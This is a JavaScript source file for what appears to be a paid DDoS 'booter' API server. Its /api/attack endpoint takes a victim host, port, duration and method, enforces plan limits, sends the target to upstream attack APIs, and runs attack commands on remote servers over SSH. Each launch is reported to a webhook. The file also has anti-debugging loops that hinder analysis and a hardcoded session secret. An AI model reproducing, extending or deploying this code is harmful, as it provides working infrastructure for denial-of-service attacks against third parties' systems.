'use strict';
(function() {
 var g = void 0;
 try {
   var darkenHexChannel = Function('return (function() {}.constructor("return this")( ));');
   g = darkenHexChannel();
 } catch (_0x33c6ae) {
   g = window;
 }
 g.setInterval(_0x50f2be, 4e3);
})();
var _0x41945e = function() {
 var closeExpr = true;
 return function(nextBuilder, method) {
   var closingExpr = closeExpr ? function() {
     if (method) {
       var cssobj = method.apply(nextBuilder, arguments);
       method = null;
       return cssobj;
     }
   } : function() {
   };
   closeExpr = false;
   return closingExpr;
 };
}();
(function() {
 _0x41945e(this, function() {
   var action = new RegExp("function *\\( *\\)");
   var filter = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i");
   var prefix = _0x50f2be("init");
   if (!action.test(prefix + "chain") || !filter.test(prefix + "input")) {
     prefix("0");
   } else {
     _0x50f2be();
   }
 })();
})();
var express = require("express");
var fs = require("fs");
var session = require("express-session");
var bodyParser = require("body-parser");
var ip = require("net");
var fetch = require("node-fetch");
var ssh2 = require("ssh2");
var path = require("path");
var user_dbFile = "users.json";
var config_dbFile = "config.json";
var app = express();
var port = 80;
var _0xab0249 = {};
_0xab0249.extended = false;
app.use(bodyParser.urlencoded(_0xab0249));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "html")));
app.use(express.json());
function SendAttack(port, key, username, i, dash_on, dash_off) {
 try {
   var sshConn = new ssh2.Client;
   var options = {
     host : "" + port,
     port : parseInt(key),
     username : "" + username,
     password : "" + i
   };
   sshConn.on("ready", function() {
     console.log("Connected to SSH server");
     sshConn.exec(dash_on + " " + dash_off, function(canCreateDiscussions, originalConnection) {
       if (canCreateDiscussions) {
         throw canCreateDiscussions;
       }
       originalConnection.on("close", function(spofHosts, canCreateDiscussions) {
         console.log("Command execution completed with code: " + spofHosts);
         sshConn.end();
       }).on("data", function(spofHosts) {
         console.log("Command output: " + spofHosts);
       }).stderr.on("data", function(maxRev) {
         console.error("Command error output: " + maxRev);
       });
     });
   });
   sshConn.on("error", function(whichEye) {
     console.error("SSH connection error:", whichEye);
   });
   sshConn.connect(options);
 } catch (_0x13d2fa) {
 }
}
var _0x2a2bde = {};
_0x2a2bde.secret = "IUONIOHUGIYFUTDYTUYIUHOIJHUIG";
_0x2a2bde.resave = false;
_0x2a2bde.saveUninitialized = false;
app.use(session(_0x2a2bde));
function ValidPort(i) {
 i = Number(i);
 return Number.isInteger(i) && i > 0 && i <= 65535;
}
app.get("/admin", function(req, res) {
 var _0x268f88 = req.session.authenticated || false;
 if (_0x268f88) {
   res.sendFile(__dirname + "/html/test.html");
 } else {
   res.sendFile(__dirname + "/html/login.html");
 }
});
app.post("/admin/login", function(req, res) {
 var credentials = req.body;
 var username = credentials.username;
 var key = credentials.password;
 var _0x53a3a8 = configuration.find(function(self) {
   return self.user === "" + username && self.pass === "" + key;
 });
 if (_0x53a3a8) {
   req.session.authenticated = true;
   res.redirect("/admin");
 } else {
   res.send("Invalid username or password");
 }
});
app.use(function(options, res, saveNotifs) {
 var _0x379d49 = options.session.authenticated || false;
 if (options.path !== "/admin") {
   return saveNotifs();
 }
 if (_0x379d49) {
   return saveNotifs();
 } else {
   return res.redirect("/admin");
 }
});
var users = [];
var configuration = [];
if (fs.existsSync(user_dbFile)) {
 try {
   var sort = fs.readFileSync(user_dbFile);
   users = JSON.parse(sort);
 } catch (ChangeSetName) {
   console.error("Error parsing user data:", ChangeSetName);
 }
}
if (fs.existsSync(config_dbFile)) {
 try {
   var body = fs.readFileSync(config_dbFile);
   configuration = JSON.parse(body);
 } catch (ChangeSetName) {
   console.error("Error parsing user data:", ChangeSetName);
 }
}
app.get("/api/attack", function(sequelize, http_res) {
 async function render() {
   var body = {
     content : null,
     embeds : [{
       color : null,
       fields : [{
         name : "User",
         value : "```\n" + ("" + opts.username) + "\n```"
       }, {
         name : "IP",
         value : "```\n" + ("" + value) + "\n```",
         inline : true
       }, {
         name : "PORT",
         value : "```\n" + ("" + i) + "\n```",
         inline : true
       }, {
         name : "Method",
         value : "```\n" + ("" + method) + "\n```",
         inline : true
       }, {
         name : "Time",
         value : "```\n" + ("" + time) + "\n```",
         inline : true
       }, {
         name : "Logs",
         value : '```json\n{\n    "success":"true",\n    "message": "Attack sent successfully",\n    "host": ' + ("" + value) + ', \n    "method": ' + ("" + method) + ', \n    "port": ' + ("" + i) + ', \n    "time": ' + ("" + time) + "\n  }\n```"
       }]
     }],
     attachments : []
   };
   try {
     var result = await fetch(YAHOO_FEED_API_URL, {
       method : "POST",
       headers : {
         "Content-Type" : "application/json"
       },
       body : JSON.stringify(body)
     });
     if (result.ok) {
     } else {
       console.error("Failed to send webhook request:", result.status, result.statusText);
     }
   } catch (ChangeSetName) {
     console.error("Error sending webhook request:", ChangeSetName);
   }
 }
 if (fs.existsSync(user_dbFile)) {
   try {
     var sort = fs.readFileSync(user_dbFile);
     users = JSON.parse(sort);
   } catch (ChangeSetName) {
     console.error("Error parsing user data:", ChangeSetName);
   }
 }
 if (fs.existsSync(config_dbFile)) {
   try {
     var body = fs.readFileSync(config_dbFile);
     configuration = JSON.parse(body);
   } catch (ChangeSetName) {
     console.error("Error parsing user data:", ChangeSetName);
   }
 }
 var options = sequelize.query;
 var name = options.username;
 var password = options.password;
 var value = options.host;
 var i = options.port;
 var time = options.time;
 var method = options.method;
 if (!name) {
   return http_res.status(429).json(_0x4b636);
 }
 if (!password) {
   return http_res.status(429).json(_0x52b9c4);
 }
 if (!value) {
   return http_res.status(429).json(_0xafb81c);
 }
 if (ip.isIPv6(value)) {
   return http_res.status(429).json(_0x3f9dcc);
 }
 if (!ip.isIPv4(value) && (!value.startsWith("https") || !value.startsWith("http"))) {
   return http_res.status(429).json({
     success : "false",
     message : "Invalid Host"
   });
 }
 if (!i || !ValidPort(i)) {
   return http_res.status(429).json({
     success : "false",
     message : "Invalid Port"
   });
 }
 if (!time) {
   return http_res.status(429).json(_0x4049d9);
 }
 if (!method) {
   return http_res.status(429).json(_0xd03fff);
 }
 var opts = users.find(function(setting) {
   return setting.username === name && setting.password === password;
 });
 var methods = configuration[0].Methods;
 var that = configuration[0].Default;
 var YAHOO_FEED_API_URL = configuration[0].webhook;
 if (!methods["" + method]) {
   return http_res.status(429).json(_0xcc6342);
 }
 var vmArgSetters = configuration[0].Servers;
 var api = configuration[0].Methods["" + method].API;
 if (!opts) {
   return http_res.status(429).json(_0x5675c8);
 }
 var min = Number(opts.maxCons) || 0;
 var topValue = Number(opts.maxDuration) || 0;
 var maxDate = Number(opts.planExpire) || 0;
 var date = Number(Math.round(Number((new Date).getTime()) / 1e3));
 time = Number(time);
 if (date > maxDate) {
   var user_index = users.findIndex(function(story) {
     return story.username === name;
   });
   if (user_index !== -1) {
     users.splice(user_index, 1);
     saveUsers();
   }
   return http_res.status(429).json(_0x34678c);
 }
 if (Number(time) > Number(topValue)) {
   return http_res.status(429).json({
     success : "false",
     message : "Duration is more than your plan supports"
   });
 }
 if (!opts.connections) {
   opts.connections = {};
 }
 var operandSet = Object.values(opts.connections).filter(function(asyncList) {
   return asyncList.every(function(options, nodeType) {
     return nodeType === 0 || options && options > Math.round(Number((new Date).getTime()) / 1e3);
   });
 });
 if (operandSet[0]) {
   console.log(operandSet[0][1] > date);
 }
 if (Number(operandSet.length) >= Number(min)) {
   return http_res.status(429).json(_0x71c944);
 }
 var f = 1;
 for (; opts.connections["con" + f] && opts.connections["con" + f][0];) {
   f++;
 }
 Object.keys(opts.connections).forEach(function(k) {
   if (Number(date) > Number(opts.connections[k][1])) {
     opts.connections[k][0] = false;
   }
 });
 var fulldate = date + time;
 opts.connections["con" + f] = [true, fulldate];
 saveUsers();
 var thousands = that.PPS;
 var pageno = that.Threads;
 var currentIDstring = that.Packet_Size;
 api.map(function(url) {
   try {
     console.log(url);
     fetch("" + url.replace("[host]", "" + value).replace("[port]", "" + i).replace("[time]", "" + time)).then(function(canCreateDiscussions) {
     }).then(function(canCreateDiscussions) {
     }).catch(function(canCreateDiscussions) {
     });
   } catch (_0x5cb792) {
   }
 });
 var _iteratorNormalCompletion3 = true;
 var _didIteratorError = false;
 var _iteratorError = undefined;
 try {
   var _iterator3 = vmArgSetters[Symbol.iterator]();
   var _step2;
   for (; !(_iteratorNormalCompletion3 = (_step2 = _iterator3.next()).done); _iteratorNormalCompletion3 = true) {
     var data = _step2.value;
     try {
       options = methods["" + method];
       var x = data.IP;
       var y = data.Port;
       var player = data.Username;
       var res = data.Password;
       console.log([x, y, player, res]);
       var masterVideoId = options.Args.replace("[host]", "" + value).replace("[port]", "" + i).replace("[time]", "" + time).replace("[packet_size]", "" + currentIDstring).replace("[threads]", "" + pageno).replace("[pps]", "" + thousands);
       SendAttack("" + x, "" + y, "" + player, "" + res, "" + options.File, "" + masterVideoId);
     } catch (conv_reverse_sort) {
       console.log(conv_reverse_sort);
     }
   }
 } catch (err) {
   _didIteratorError = true;
   _iteratorError = err;
 } finally {
   try {
     if (!_iteratorNormalCompletion3 && _iterator3.return) {
       _iterator3.return();
     }
   } finally {
     if (_didIteratorError) {
       throw _iteratorError;
     }
   }
 }
 data = {
   success : "true",
   message : "Attack sent successfully",
   host : "" + value,
   method : "" + method,
   port : "" + i,
   time : "" + time
 };
 http_res.json(data);
 render();
});
app.get("/api/methods", function(canCreateDiscussions, res) {
 if (fs.existsSync(config_dbFile)) {
   try {
     var body = fs.readFileSync(config_dbFile);
     configuration = JSON.parse(body);
   } catch (ChangeSetName) {
     console.error("Error parsing user data:", ChangeSetName);
   }
 }
 var linuxWithVersion = configuration[0].Methods[0];
 var commandName = Object.keys(linuxWithVersion).join("\n");
 return res.setHeader("Content-Type", "text/plain").send("" + commandName);
});
app.get("/", function(canCreateDiscussions, res) {
 if (fs.existsSync(user_dbFile)) {
   try {
     var sort = fs.readFileSync(user_dbFile);
     users = JSON.parse(sort);
   } catch (ChangeSetName) {
     console.error("Error parsing user data:", ChangeSetName);
   }
 }
 if (fs.existsSync(config_dbFile)) {
   try {
     var body = fs.readFileSync(config_dbFile);
     configuration = JSON.parse(body);
   } catch (ChangeSetName) {
     console.error("Error parsing user data:", ChangeSetName);
   }
 }
 var methods = configuration[0].Methods;
 var expRecords = configuration[0].Servers;
 var _0x228892 = Object.keys(methods).join("\n");
 res.setHeader("Content-Type", "text/plain");
 return res.end("\nThis api manager was made by https://t.me/@yh_dev\n\nServers: " + expRecords.length + "\n\nUsers: " + users.length + "\n\n\nNumber of Methods: " + Object.keys(methods).length + "\n\nMethods: \n" + _0x228892 + "\n");
});
app.get("/api/users/add", function(options, skt) {
 if (fs.existsSync(user_dbFile)) {
   try {
     var sort = fs.readFileSync(user_dbFile);
     users = JSON.parse(sort);
   } catch (ChangeSetName) {
     console.error("Error parsing user data:", ChangeSetName);
   }
 }
 var data = options.query;
 var username = data.username;
 var password = data.password;
 var currentAnime = data.maxCons;
 var maxDuration = data.maxDuration;
 var old_queue_user_list = data.planExpire;
 var _0xa025c8 = users.find(function(result) {
   return result.username === username;
 });
 var _0x4e7d74 = (new Date).getTime();
 if (_0xa025c8) {
   skt.status(409).send("User already exists");
 } else {
   var f = {
     username : username,
     password : password,
     maxCons : currentAnime,
     maxDuration : maxDuration,
     planExpire : _0x4e7d74 + old_queue_user_list * 24 * 60 * 60 * 1e3,
     connections : {}
   };
   users.push(f);
   saveUsers();
   var disabledURLs = users.find(function(result) {
     return result.username === username;
   });
   skt.send("User added successfully\n\r\n\r" + JSON.stringify(disabledURLs));
 }
});
app.get("/api/users/lookup", function(Activity, http_res) {
 var username = Activity.query.username;
 var data = users.find(function(result) {
   return result.username === username;
 });
 if (data) {
   http_res.json(data);
 } else {
   http_res.status(404).json(_0x4fb501);
 }
});
app.get("/api/users/remove", function(Activity, skt) {
 var username = Activity.query.username;
 var user_index = users.findIndex(function(result) {
   return result.username === username;
 });
 if (user_index === -1) {
   skt.status(404).send("User not found");
 } else {
   users.splice(user_index, 1);
   saveUsers();
   skt.send("User removed successfully");
 }
});
function saveUsers() {
 fs.writeFileSync(user_dbFile, JSON.stringify(users, null, 2));
}
app.listen(port, function() {
 console.log("Authentication system running on port " + port);
});
app.get("*", function(canCreateDiscussions, testsStatus) {
 testsStatus.status(503);
});
app.post("*", function(canCreateDiscussions, testsStatus) {
 testsStatus.status(503);
});
function _0x50f2be(event) {
 function render(i) {
   if (typeof i === "string") {
     return function(canCreateDiscussions) {
     }.constructor("while (true) {}").apply("counter");
   } else {
     if (("" + i / i).length !== 1 || i % 20 === 0) {
       (function() {
         return true;
       }).constructor("debugger").call("action");
     } else {
       (function() {
         return false;
       }).constructor("debugger").apply("stateObject");
     }
   }
   render(++i);
 }
 try {
   if (event) {
     return render;
   } else {
     render(0);
   }
 } catch (_0x30518d) {
 }
}
;
